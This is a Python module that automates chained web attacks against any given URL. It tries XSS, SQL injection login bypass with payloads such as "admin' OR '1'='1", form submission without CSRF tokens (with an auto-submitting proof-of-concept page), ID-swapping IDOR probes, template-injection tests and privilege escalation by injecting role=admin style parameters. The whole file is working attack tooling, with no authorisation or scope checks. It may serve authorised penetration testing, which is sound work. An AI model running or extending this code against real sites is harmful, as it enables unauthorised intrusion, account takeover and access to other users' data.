import logging
import requests
import json
import re
from urllib.parse import urlparse, parse_qsl, urlencode, urljoin
from bs4 import BeautifulSoup
import datetime

def create_exploit_chain(target, exploit_chain, custom_payload=None):
    """Create and execute an exploitation chain."""
    results = {
        'success': False,
        'chain_results': [],
        'final_impact': 'None'
    }
    
    # Parse URL
    parsed_url = urlparse(target)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Session to maintain state between requests
    session = requests.Session()
    
    # Initial request to get baseline and cookies
    try:
        initial_response = session.get(target, timeout=10)
        results['chain_results'].append({
            'step': 'initial_request',
            'url': target,
            'status_code': initial_response.status_code,
            'response_length': len(initial_response.text)
        })
    except Exception as e:
        logging.error(f"Error in initial request: {str(e)}")
        results['error'] = str(e)
        return results
    
    # Execute each step in the chain
    current_response = initial_response
    current_url = target
    
    for i, step in enumerate(exploit_chain):
        step_results = {
            'step': f"step_{i+1}_{step}",
            'exploitation_type': step,
            'success': False
        }
        
        try:
            if step == 'xss':
                step_results.update(chain_step_xss(current_url, session, custom_payload))
            elif step == 'sql_injection':
                step_results.update(chain_step_sqli(current_url, session, custom_payload))
            elif step == 'csrf':
                step_results.update(chain_step_csrf(current_url, session, custom_payload))
            elif step == 'idor':
                step_results.update(chain_step_idor(current_url, session, custom_payload))
            elif step == 'ssti':
                step_results.update(chain_step_ssti(current_url, session, custom_payload))
            elif step == 'auth_bypass':
                step_results.update(chain_step_auth_bypass(current_url, session, custom_payload))
            elif step == 'privilege_escalation':
                step_results.update(chain_step_priv_esc(current_url, session, custom_payload))
            else:
                step_results['error'] = f"Unsupported exploitation type: {step}"
                step_results['success'] = False
            
            if 'next_url' in step_results and step_results['next_url']:
                current_url = step_results['next_url']
            
            if 'response' in step_results:
                current_response = step_results['response']
                # Remove response object from results to make it serializable
                del step_results['response']
                
            if not step_results['success']:
                logging.warning(f"Chain step {step} failed")
            else:
                logging.info(f"Chain step {step} succeeded")
                
        except Exception as e:
            logging.error(f"Error in chain step {step}: {str(e)}")
            step_results['error'] = str(e)
            step_results['success'] = False
            
        results['chain_results'].append(step_results)
        
        # If a step fails, we might want to stop the chain
        if not step_results['success'] and i < len(exploit_chain) - 1:
            results['chain_results'].append({
                'step': 'chain_interrupted',
                'reason': f"Step {i+1} ({step}) failed"
            })
            break
    
    # Determine overall success and impact
    successful_steps = [step['success'] for step in results['chain_results'] if 'success' in step]
    results['success'] = any(successful_steps)
    
    # Simple impact assessment based on what was achieved
    if results['success']:
        impact_levels = []
        
        for step in results['chain_results']:
            if step.get('success'):
                if step.get('exploitation_type') == 'xss':
                    impact_levels.append(2)  # Medium impact
                elif step.get('exploitation_type') == 'sql_injection':
                    impact_levels.append(3)  # High impact
                elif step.get('exploitation_type') == 'csrf':
                    impact_levels.append(2)  # Medium impact
                elif step.get('exploitation_type') == 'idor':
                    impact_levels.append(2)  # Medium impact
                elif step.get('exploitation_type') == 'ssti':
                    impact_levels.append(3)  # High impact
                elif step.get('exploitation_type') == 'auth_bypass':
                    impact_levels.append(3)  # High impact
                elif step.get('exploitation_type') == 'privilege_escalation':
                    impact_levels.append(4)  # Critical impact
        
        if impact_levels:
            max_impact = max(impact_levels)
            if max_impact == 1:
                results['final_impact'] = 'Low'
            elif max_impact == 2:
                results['final_impact'] = 'Medium'
            elif max_impact == 3:
                results['final_impact'] = 'High'
            elif max_impact == 4:
                results['final_impact'] = 'Critical'
    
    return results

def chain_step_xss(url, session, custom_payload=None):
    """XSS step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'xss'
    }
    
    # Use custom payload if provided, otherwise use default
    payload = custom_payload if custom_payload else '<script>alert(1)</script>'
    
    # Parse URL
    parsed_url = urlparse(url)
    params = dict(parse_qsl(parsed_url.query))
    
    # If no parameters, try to find some from the page
    if not params:
        try:
            response = session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                if not form_action:
                    form_url = url
                elif form_action.startswith('/'):
                    form_url = urljoin(url, form_action)
                else:
                    form_url = form_action
                
                form_method = form.get('method', 'get').lower()
                
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Try the payload in each field
                for field_name in form_data:
                    test_data = form_data.copy()
                    test_data[field_name] = payload
                    
                    if form_method == 'post':
                        test_response = session.post(form_url, data=test_data, timeout=10)
                    else:
                        test_response = session.get(form_url, params=test_data, timeout=10)
                    
                    if payload in test_response.text:
                        results['success'] = True
                        results['vulnerable_parameter'] = field_name
                        results['form_url'] = form_url
                        results['form_method'] = form_method
                        results['payload'] = payload
                        results['next_url'] = test_response.url
                        results['response'] = test_response
                        return results
                        
        except Exception as e:
            logging.error(f"Error in XSS chain step (form analysis): {str(e)}")
            results['error'] = str(e)
            return results
    
    # Try URL parameters if available
    for param in params:
        test_params = params.copy()
        test_params[param] = payload
        
        try:
            test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
            response = session.get(test_url, timeout=10)
            
            if payload in response.text:
                results['success'] = True
                results['vulnerable_parameter'] = param
                results['payload'] = payload
                results['next_url'] = response.url
                results['response'] = response
                return results
                
        except Exception as e:
            logging.error(f"Error in XSS chain step (parameter testing): {str(e)}")
            
    return results

def chain_step_sqli(url, session, custom_payload=None):
    """SQL Injection step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'sql_injection'
    }
    
    # Use custom payload if provided, otherwise use default
    payload = custom_payload if custom_payload else "' OR '1'='1"
    
    # Parse URL
    parsed_url = urlparse(url)
    params = dict(parse_qsl(parsed_url.query))
    
    # Function to check for SQL error patterns
    def check_sql_errors(response_text):
        error_patterns = [
            'SQL syntax',
            'mysql_fetch',
            'ORA-',
            'Error Executing Database Query',
            'SQLite3',
            'Microsoft SQL Native Client',
            'PostgreSQL',
            'SQLSTATE',
            'syntax error'
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response_text.lower():
                return True
        return False
    
    # Function to check for successful authentication bypass
    def check_auth_bypass(response, original_response=None):
        # Look for signs of successful login
        success_patterns = [
            'welcome',
            'logout',
            'dashboard',
            'profile',
            'account',
            'admin',
            'success'
        ]
        
        # If we have original response to compare
        if original_response:
            if len(response.text) - len(original_response.text) > 100:
                return True
                
            if response.url != original_response.url and '/dashboard' in response.url:
                return True
        
        for pattern in success_patterns:
            if pattern.lower() in response.text.lower():
                return True
                
        return False
    
    # Try URL parameters if available
    for param in params:
        test_params = params.copy()
        test_params[param] = payload
        
        try:
            # Get original response for comparison
            original_response = session.get(url, timeout=10)
            
            test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
            response = session.get(test_url, timeout=10)
            
            if check_sql_errors(response.text):
                results['success'] = True
                results['vulnerable_parameter'] = param
                results['payload'] = payload
                results['evidence'] = 'SQL error detected'
                results['next_url'] = response.url
                results['response'] = response
                return results
                
            # Check for potential authentication bypass
            if check_auth_bypass(response, original_response):
                results['success'] = True
                results['vulnerable_parameter'] = param
                results['payload'] = payload
                results['evidence'] = 'Potential authentication bypass'
                results['next_url'] = response.url
                results['response'] = response
                return results
                
        except Exception as e:
            logging.error(f"Error in SQLi chain step (parameter testing): {str(e)}")
    
    # Try login forms for authentication bypass
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for forms, especially login forms
        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            if not form_action:
                form_url = url
            elif form_action.startswith('/'):
                form_url = urljoin(url, form_action)
            else:
                form_url = form_action
            
            form_method = form.get('method', 'get').lower()
            
            # Check if this might be a login form
            is_login_form = False
            password_field = None
            
            for input_field in form.find_all('input'):
                if input_field.get('type') == 'password':
                    is_login_form = True
                    password_field = input_field.get('name')
                    break
            
            if is_login_form and password_field:
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Try SQLi in username field (assuming it's not the password field)
                for field_name in form_data:
                    if field_name != password_field:  # Likely username field
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        test_data[password_field] = "password"  # Arbitrary password
                        
                        if form_method == 'post':
                            test_response = session.post(form_url, data=test_data, timeout=10)
                        else:
                            test_response = session.get(form_url, params=test_data, timeout=10)
                        
                        if check_auth_bypass(test_response):
                            results['success'] = True
                            results['vulnerable_form'] = form_url
                            results['vulnerable_parameter'] = field_name
                            results['payload'] = payload
                            results['evidence'] = 'Potential authentication bypass'
                            results['next_url'] = test_response.url
                            results['response'] = test_response
                            return results
                            
        # If no login form found, look for any form
        if not results['success']:
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                if not form_action:
                    form_url = url
                elif form_action.startswith('/'):
                    form_url = urljoin(url, form_action)
                else:
                    form_url = form_action
                
                form_method = form.get('method', 'get').lower()
                
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Try the payload in each field
                for field_name in form_data:
                    test_data = form_data.copy()
                    test_data[field_name] = payload
                    
                    if form_method == 'post':
                        test_response = session.post(form_url, data=test_data, timeout=10)
                    else:
                        test_response = session.get(form_url, params=test_data, timeout=10)
                    
                    if check_sql_errors(test_response.text):
                        results['success'] = True
                        results['vulnerable_form'] = form_url
                        results['vulnerable_parameter'] = field_name
                        results['payload'] = payload
                        results['evidence'] = 'SQL error detected'
                        results['next_url'] = test_response.url
                        results['response'] = test_response
                        return results
                        
    except Exception as e:
        logging.error(f"Error in SQLi chain step (form analysis): {str(e)}")
        results['error'] = str(e)
    
    return results

def chain_step_csrf(url, session, custom_payload=None):
    """CSRF step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'csrf'
    }
    
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for forms
        for form in soup.find_all('form'):
            if form.get('method', '').lower() == 'post':  # Focus on POST forms
                form_action = form.get('action', '')
                if not form_action:
                    form_url = url
                elif form_action.startswith('/'):
                    form_url = urljoin(url, form_action)
                else:
                    form_url = form_action
                
                # Check for CSRF token
                csrf_token = None
                
                # Common CSRF token field names
                csrf_fields = [
                    'csrf_token',
                    'csrf',
                    'csrfmiddlewaretoken',
                    'CSRFToken',
                    'CSRF-Token',
                    'XSRF-TOKEN',
                    '_csrf',
                    '_token',
                    'authenticity_token'
                ]
                
                for field in csrf_fields:
                    token_field = form.find('input', {'name': field})
                    if token_field:
                        csrf_token = {
                            'name': field,
                            'value': token_field.get('value', '')
                        }
                        break
                
                # If no CSRF token found, it might be vulnerable
                if not csrf_token:
                    # Collect form fields for a CSRF PoC
                    form_fields = []
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        if input_field.get('name'):
                            field_info = {
                                'name': input_field['name'],
                                'type': input_field.get('type', 'text')
                            }
                            if input_field.get('value'):
                                field_info['value'] = input_field['value']
                            form_fields.append(field_info)
                    
                    # Create form data for testing
                    form_data = {}
                    for field in form_fields:
                        if field['type'] == 'hidden':
                            form_data[field['name']] = field.get('value', '')
                        else:
                            # Use custom values for certain fields
                            if 'email' in field['name'].lower():
                                form_data[field['name']] = 'csrf_test@example.com'
                            elif 'name' in field['name'].lower():
                                form_data[field['name']] = 'CSRF Test'
                            elif 'message' in field['name'].lower() or 'comment' in field['name'].lower():
                                form_data[field['name']] = 'This is a CSRF test comment'
                            else:
                                form_data[field['name']] = 'csrftest'
                    
                    # Send the form to see if it works without a CSRF token
                    try:
                        test_response = session.post(form_url, data=form_data, timeout=10)
                        
                        # Check if the form submission was successful
                        if test_response.status_code == 200 or test_response.status_code == 302:
                            results['success'] = True
                            results['vulnerable_form'] = form_url
                            results['proof_of_concept'] = generate_csrf_poc(form_url, form_fields)
                            results['next_url'] = test_response.url
                            results['response'] = test_response
                            return results
                    except Exception as e:
                        logging.error(f"Error testing CSRF in form: {str(e)}")
                        
    except Exception as e:
        logging.error(f"Error in CSRF chain step: {str(e)}")
        results['error'] = str(e)
    
    return results

def generate_csrf_poc(action_url, fields):
    """Generate a CSRF Proof of Concept HTML form."""
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF PoC</title>
    </head>
    <body>
        <h1>CSRF Proof of Concept</h1>
        <form action="{action_url}" method="post" id="csrf-form">
    """
    
    for field in fields:
        field_type = field.get('type', 'text')
        field_name = field.get('name', '')
        field_value = field.get('value', '')
        
        html += f'    <input type="{field_type}" name="{field_name}" value="{field_value}" />\n'
    
    html += """
        </form>
        <script>
            // Automatically submit the form when page loads
            document.getElementById("csrf-form").submit();
        </script>
    </body>
    </html>
    """
    
    return html

def chain_step_idor(url, session, custom_payload=None):
    """IDOR step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'idor'
    }
    
    # Use custom payload if provided, otherwise use default IDs to try
    id_variations = [custom_payload] if custom_payload else ['1', '2', '0', 'admin']
    
    # Look for ID parameters in URL
    parsed_url = urlparse(url)
    params = dict(parse_qsl(parsed_url.query))
    
    # ID pattern in URL path
    path = parsed_url.path
    id_pattern = re.search(r'/(\d+)(?:/|$)', path)
    
    if id_pattern:
        original_id = id_pattern.group(1)
        base_path = path[:id_pattern.start(1)]
        end_path = path[id_pattern.end(1):]
        
        baseline_response = session.get(url, timeout=10)
        
        for variation in id_variations:
            if variation == original_id:
                continue
                
            try:
                test_path = base_path + variation + end_path
                test_url = parsed_url._replace(path=test_path).geturl()
                
                response = session.get(test_url, timeout=10)
                
                # Check if response is successful and content differs from baseline
                if response.status_code == 200 and len(response.text) > 100:
                    # Simple check: if the response is successful and has meaningful content
                    # and it's different from the baseline, it might indicate IDOR
                    similarity = calculate_similarity(baseline_response.text, response.text)
                    
                    if similarity < 0.8 and similarity > 0.3:  # Arbitrary thresholds
                        results['success'] = True
                        results['original_id'] = original_id
                        results['tested_id'] = variation
                        results['test_url'] = test_url
                        results['similarity'] = similarity
                        results['next_url'] = test_url
                        results['response'] = response
                        return results
            except Exception as e:
                logging.error(f"Error testing IDOR with ID {variation}: {str(e)}")
    
    # Test ID parameters in query string
    id_params = [param for param in params if re.search(r'id$|^id|_id', param, re.I)]
    
    if id_params:
        baseline_response = session.get(url, timeout=10)
        
        for param in id_params:
            original_value = params[param]
            
            for variation in id_variations:
                if variation == original_value:
                    continue
                    
                try:
                    test_params = params.copy()
                    test_params[param] = variation
                    
                    test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                    
                    response = session.get(test_url, timeout=10)
                    
                    # Check if response is successful and content differs from baseline
                    if response.status_code == 200 and len(response.text) > 100:
                        similarity = calculate_similarity(baseline_response.text, response.text)
                        
                        if similarity < 0.8 and similarity > 0.3:  # Arbitrary thresholds
                            results['success'] = True
                            results['parameter'] = param
                            results['original_value'] = original_value
                            results['tested_value'] = variation
                            results['test_url'] = test_url
                            results['similarity'] = similarity
                            results['next_url'] = test_url
                            results['response'] = response
                            return results
                except Exception as e:
                    logging.error(f"Error testing IDOR with parameter {param}={variation}: {str(e)}")
    
    # Look for endpoints that might contain user data
    common_user_endpoints = [
        '/profile',
        '/user',
        '/account',
        '/settings',
        '/dashboard'
    ]
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    for endpoint in common_user_endpoints:
        try:
            endpoint_url = urljoin(base_url, endpoint)
            
            # Try with numeric IDs
            for user_id in ['1', '2', '3', 'admin']:
                test_url = f"{endpoint_url}/{user_id}"
                response = session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 100:
                    # Check if it contains user-like data
                    if any(term in response.text.lower() for term in ['user', 'profile', 'account', 'email', 'name']):
                        results['success'] = True
                        results['endpoint'] = endpoint
                        results['user_id'] = user_id
                        results['test_url'] = test_url
                        results['next_url'] = test_url
                        results['response'] = response
                        return results
        except Exception as e:
            logging.error(f"Error testing common user endpoint {endpoint}: {str(e)}")
    
    return results

def calculate_similarity(text1, text2):
    """Calculate a simple similarity ratio between two texts."""
    # This is a very simple implementation
    # For production, consider using more sophisticated methods
    if not text1 or not text2:
        return 0
    
    # Convert to sets of words for a basic comparison
    words1 = set(re.findall(r'\w+', text1.lower()))
    words2 = set(re.findall(r'\w+', text2.lower()))
    
    if not words1 or not words2:
        return 0
    
    # Jaccard similarity
    intersection = len(words1.intersection(words2))
    union = len(words1.union(words2))
    
    return intersection / union if union > 0 else 0

def chain_step_ssti(url, session, custom_payload=None):
    """SSTI step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'ssti'
    }
    
    # Use custom payload if provided, otherwise use default
    payload = custom_payload if custom_payload else '${7*7}'
    
    # Function to check for SSTI evidence in response
    def check_ssti_evidence(response_text, payload):
        # Check for common SSTI result patterns
        if '${7*7}' in payload:
            return '49' in response_text
        elif '{{7*7}}' in payload:
            return '49' in response_text
        elif '{7*7}' in payload:
            return '49' in response_text
        elif '<%= 7*7 %>' in payload:
            return '49' in response_text
        elif '#{7*7}' in payload:
            return '49' in response_text
        elif '${{7*7}}' in payload:
            return '49' in response_text
        
        return False
    
    # Parse URL
    parsed_url = urlparse(url)
    params = dict(parse_qsl(parsed_url.query))
    
    # Try URL parameters
    if params:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                response = session.get(test_url, timeout=10)
                
                if check_ssti_evidence(response.text, payload):
                    results['success'] = True
                    results['vulnerable_parameter'] = param
                    results['payload'] = payload
                    results['test_url'] = test_url
                    results['next_url'] = test_url
                    results['response'] = response
                    return results
                    
            except Exception as e:
                logging.error(f"Error testing SSTI in parameter {param}: {str(e)}")
    
    # Try forms
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            if not form_action:
                form_url = url
            elif form_action.startswith('/'):
                form_url = urljoin(url, form_action)
            else:
                form_url = form_action
            
            form_method = form.get('method', 'get').lower()
            
            # Get form fields
            form_data = {}
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('name'):
                    form_data[input_field['name']] = input_field.get('value', '')
            
            # Try each field
            for field_name in form_data:
                test_data = form_data.copy()
                test_data[field_name] = payload
                
                try:
                    if form_method == 'post':
                        test_response = session.post(form_url, data=test_data, timeout=10)
                    else:
                        test_response = session.get(form_url, params=test_data, timeout=10)
                    
                    if check_ssti_evidence(test_response.text, payload):
                        results['success'] = True
                        results['vulnerable_form'] = form_url
                        results['vulnerable_parameter'] = field_name
                        results['form_method'] = form_method
                        results['payload'] = payload
                        results['next_url'] = test_response.url
                        results['response'] = test_response
                        return results
                        
                except Exception as e:
                    logging.error(f"Error testing SSTI in form field {field_name}: {str(e)}")
                    
    except Exception as e:
        logging.error(f"Error in SSTI form testing: {str(e)}")
    
    return results

def chain_step_auth_bypass(url, session, custom_payload=None):
    """Authentication bypass step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'auth_bypass'
    }
    
    # Use custom payload if provided, otherwise use default
    payload = custom_payload if custom_payload else "admin' OR '1'='1"
    
    # Try to locate login forms
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for login-related links
        login_urls = []
        for link in soup.find_all('a', href=True):
            href = link['href']
            link_text = link.text.lower()
            
            if ('login' in href.lower() or 
                'signin' in href.lower() or 
                'login' in link_text or 
                'sign in' in link_text or 
                'log in' in link_text):
                
                if href.startswith('/'):
                    login_url = urljoin(url, href)
                elif not href.startswith(('http://', 'https://')):
                    login_url = urljoin(url, href)
                else:
                    login_url = href
                    
                login_urls.append(login_url)
        
        # Add current URL if it might be a login page
        if ('login' in url.lower() or 
            'signin' in url.lower() or 
            any(term in response.text.lower() for term in ['login', 'sign in', 'log in', 'username', 'password'])):
            login_urls.append(url)
            
        # Remove duplicates
        login_urls = list(set(login_urls))
        
        # Process each potential login URL
        for login_url in login_urls:
            try:
                login_response = session.get(login_url, timeout=10)
                login_soup = BeautifulSoup(login_response.text, 'html.parser')
                
                for form in login_soup.find_all('form'):
                    # Check if this looks like a login form
                    is_login_form = False
                    password_field = None
                    
                    for input_field in form.find_all('input'):
                        if input_field.get('type') == 'password':
                            is_login_form = True
                            password_field = input_field.get('name')
                            break
                    
                    if is_login_form and password_field:
                        form_action = form.get('action', '')
                        if not form_action:
                            form_url = login_url
                        elif form_action.startswith('/'):
                            form_url = urljoin(login_url, form_action)
                        else:
                            form_url = form_action
                        
                        form_method = form.get('method', 'get').lower()
                        
                        # Get form fields
                        form_data = {}
                        for input_field in form.find_all(['input', 'textarea']):
                            if input_field.get('name'):
                                form_data[input_field['name']] = input_field.get('value', '')
                        
                        # Identify username field (likely not the password field)
                        username_field = None
                        for field_name in form_data:
                            if field_name != password_field:
                                # Look for likely username fields
                                if any(term in field_name.lower() for term in ['user', 'email', 'login', 'name']):
                                    username_field = field_name
                                    break
                        
                        # If no clear username field, use the first non-password field
                        if not username_field:
                            for field_name in form_data:
                                if field_name != password_field:
                                    username_field = field_name
                                    break
                        
                        if username_field:
                            # Try authentication bypass
                            test_data = form_data.copy()
                            test_data[username_field] = payload
                            test_data[password_field] = "password"  # Arbitrary password
                            
                            if form_method == 'post':
                                auth_response = session.post(form_url, data=test_data, timeout=10)
                            else:
                                auth_response = session.get(form_url, params=test_data, timeout=10)
                            
                            # Check for successful bypass
                            if auth_response.status_code == 302:  # Redirect after login is common
                                results['success'] = True
                                results['login_url'] = login_url
                                results['form_url'] = form_url
                                results['username_field'] = username_field
                                results['payload'] = payload
                                results['next_url'] = auth_response.url
                                results['response'] = auth_response
                                return results
                            
                            # Check for signs of successful login in the response
                            success_terms = ['welcome', 'dashboard', 'profile', 'account', 'logout', 'sign out']
                            if any(term in auth_response.text.lower() for term in success_terms):
                                results['success'] = True
                                results['login_url'] = login_url
                                results['form_url'] = form_url
                                results['username_field'] = username_field
                                results['payload'] = payload
                                results['next_url'] = auth_response.url
                                results['response'] = auth_response
                                return results
                                
            except Exception as e:
                logging.error(f"Error testing auth bypass for {login_url}: {str(e)}")
                
    except Exception as e:
        logging.error(f"Error in auth bypass chain step: {str(e)}")
        results['error'] = str(e)
    
    return results

def chain_step_priv_esc(url, session, custom_payload=None):
    """Privilege escalation step in exploitation chain."""
    results = {
        'success': False,
        'exploitation_type': 'privilege_escalation'
    }
    
    # Check for admin/user role manipulation
    try:
        # Parse URL
        parsed_url = urlparse(url)
        params = dict(parse_qsl(parsed_url.query))
        
        # Common parameter manipulations for privilege escalation
        priv_esc_params = {
            'role': 'admin',
            'admin': 'true',
            'isAdmin': 'true',
            'is_admin': 'true',
            'access_level': '10',
            'user_role': 'admin',
            'group': 'admin',
            'privilege': 'admin'
        }
        
        # Baseline response
        baseline_response = session.get(url, timeout=10)
        
        # Try parameter manipulation
        for param_name, param_value in priv_esc_params.items():
            # Skip if parameter already exists and matches the value
            if param_name in params and params[param_name] == param_value:
                continue
                
            test_params = params.copy()
            test_params[param_name] = param_value
            
            try:
                test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                response = session.get(test_url, timeout=10)
                
                # Check for signs of admin access
                admin_indicators = [
                    'admin dashboard',
                    'admin panel',
                    'admin console',
                    'site administration',
                    'user management',
                    'all users',
                    'manage users',
                    'system settings',
                    'global config'
                ]
                
                soup = BeautifulSoup(response.text, 'html.parser')
                page_text = soup.get_text().lower()
                
                if any(indicator.lower() in page_text for indicator in admin_indicators):
                    if not any(indicator.lower() in baseline_response.text.lower() for indicator in admin_indicators):
                        results['success'] = True
                        results['parameter'] = param_name
                        results['value'] = param_value
                        results['test_url'] = test_url
                        results['evidence'] = 'Admin indicators found in response'
                        results['next_url'] = test_url
                        results['response'] = response
                        return results
                
                # Look for new admin-like links that weren't in the baseline
                baseline_soup = BeautifulSoup(baseline_response.text, 'html.parser')
                baseline_links = {link.get('href') for link in baseline_soup.find_all('a', href=True)}
                
                for link in soup.find_all('a', href=True):
                    href = link.get('href', '')
                    if href not in baseline_links:
                        if any(admin_term in href.lower() or admin_term in link.text.lower() 
                              for admin_term in ['admin', 'manage', 'config', 'setting', 'user']):
                            results['success'] = True
                            results['parameter'] = param_name
                            results['value'] = param_value
                            results['test_url'] = test_url
                            results['new_admin_link'] = href
                            results['next_url'] = urljoin(url, href) if href.startswith('/') else href
                            results['response'] = response
                            return results
                
            except Exception as e:
                logging.error(f"Error testing privilege escalation with parameter {param_name}: {str(e)}")
        
        # Look for user profile or settings pages
        profile_endpoints = [
            '/profile',
            '/account',
            '/settings',
            '/user',
            '/me',
            '/dashboard'
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        for endpoint in profile_endpoints:
            try:
                profile_url = urljoin(base_url, endpoint)
                profile_response = session.get(profile_url, timeout=10)
                
                if profile_response.status_code == 200:
                    # Look for user ID indicators
                    soup = BeautifulSoup(profile_response.text, 'html.parser')
                    
                    # Look for user ID in URL query parameters
                    parsed_profile = urlparse(profile_response.url)
                    profile_params = dict(parse_qsl(parsed_profile.query))
                    
                    user_id_params = [param for param in profile_params if re.search(r'id$|^id|_id|user', param, re.I)]
                    
                    if user_id_params:
                        param = user_id_params[0]
                        current_id = profile_params[param]
                        
                        # Try admin ID or increment/decrement
                        for test_id in ['1', 'admin', str(int(current_id) - 1) if current_id.isdigit() else '1']:
                            if test_id == current_id:
                                continue
                                
                            test_params = profile_params.copy()
                            test_params[param] = test_id
                            
                            test_url = parsed_profile._replace(query=urlencode(test_params)).geturl()
                            test_response = session.get(test_url, timeout=10)
                            
                            if test_response.status_code == 200:
                                # Check if response is different from the original profile
                                similarity = calculate_similarity(profile_response.text, test_response.text)
                                
                                if similarity < 0.8 and similarity > 0.3:
                                    results['success'] = True
                                    results['profile_url'] = profile_url
                                    results['parameter'] = param
                                    results['original_id'] = current_id
                                    results['test_id'] = test_id
                                    results['test_url'] = test_url
                                    results['next_url'] = test_url
                                    results['response'] = test_response
                                    return results
                    
                    # Look for user ID in URL path
                    path = parsed_profile.path
                    id_pattern = re.search(r'/(\d+)(?:/|$)', path)
                    
                    if id_pattern:
                        current_id = id_pattern.group(1)
                        base_path = path[:id_pattern.start(1)]
                        end_path = path[id_pattern.end(1):]
                        
                        # Try admin ID or increment/decrement
                        for test_id in ['1', 'admin', str(int(current_id) - 1) if current_id.isdigit() else '1']:
                            if test_id == current_id:
                                continue
                                
                            test_path = base_path + test_id + end_path
                            test_url = parsed_profile._replace(path=test_path).geturl()
                            test_response = session.get(test_url, timeout=10)
                            
                            if test_response.status_code == 200:
                                # Check if response is different from the original profile
                                similarity = calculate_similarity(profile_response.text, test_response.text)
                                
                                if similarity < 0.8 and similarity > 0.3:
                                    results['success'] = True
                                    results['profile_url'] = profile_url
                                    results['original_id'] = current_id
                                    results['test_id'] = test_id
                                    results['test_url'] = test_url
                                    results['next_url'] = test_url
                                    results['response'] = test_response
                                    return results
            except Exception as e:
                logging.error(f"Error testing privilege escalation with endpoint {endpoint}: {str(e)}")
                
    except Exception as e:
        logging.error(f"Error in privilege escalation chain step: {str(e)}")
        results['error'] = str(e)
    
    return results

def perform_advanced_exploitation(target, exploit_chain, custom_payload=None):
    """
    Main function for advanced exploitation and vulnerability chaining.
    """
    if not target:
        return {'error': 'No target specified'}
    
    # Ensure target has scheme
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    logging.info(f"Starting advanced exploitation for {target}")
    
    results = {
        'target': target,
        'exploit_chain': exploit_chain,
        'timestamp': datetime.datetime.now().isoformat(),
    }
    
    # Validate the exploit chain
    valid_exploits = ['xss', 'sql_injection', 'csrf', 'idor', 'ssti', 'auth_bypass', 'privilege_escalation']
    
    if not exploit_chain:
        results['error'] = 'No exploit chain specified'
        return results
    
    for exploit in exploit_chain:
        if exploit not in valid_exploits:
            results['error'] = f'Invalid exploit type in chain: {exploit}'
            results['valid_exploits'] = valid_exploits
            return results
    
    # Execute the chain
    chain_results = create_exploit_chain(target, exploit_chain, custom_payload)
    results.update(chain_results)
    
    return results
